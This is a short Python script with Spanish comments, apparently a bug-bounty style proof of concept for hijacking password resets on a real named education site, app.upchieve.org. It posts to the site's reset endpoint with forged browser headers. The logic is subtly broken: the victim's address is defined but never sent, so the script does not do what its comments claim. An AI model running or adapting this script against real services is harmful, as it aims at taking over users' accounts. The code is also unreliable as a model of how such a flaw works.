import requests

def exploit_reset_password(target_url, victim_email, attacker_email):
    # Cabeceras HTTP, estas cabeceras pueden variar dependiendo de la web objetivo
    headers = {
        'Host': 'app.upchieve.org',  # Cambiar según el dominio del objetivo
        'Content-Type': 'application/json', 
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://app.upchieve.org',  # Ajustar según la web
        'Referer': 'https://app.upchieve.org/resetpassword',
        'X-Requested-With': 'XMLHttpRequest'
    }

    # El payload que se va a enviar para restablecer la contraseña, pero cambiando el correo a attacker_email
    payload = {
        "email": attacker_email
    }

    try:
        # Enviar la solicitud POST al endpoint de restablecimiento de contraseña
        response = requests.post(target_url, json=payload, headers=headers)
        
        # Verificar si la solicitud fue exitosa
        if response.status_code == 200:
            print(f"Exploit enviado con éxito. Verifica tu correo: {attacker_email}")
        else:
            print(f"Fallo al enviar exploit. Código de estado: {response.status_code}")
            print(response.text)
    except Exception as e:
        print(f"Error al intentar explotar: {e}")

# Ejemplo de uso
target_url = "https://app.upchieve.org/auth/reset/send"
victim_email = "victim.wearehackerone@gmail.com"
attacker_email = "attacker.email@gmail.com"

exploit_reset_password(target_url, victim_email, attacker_email)
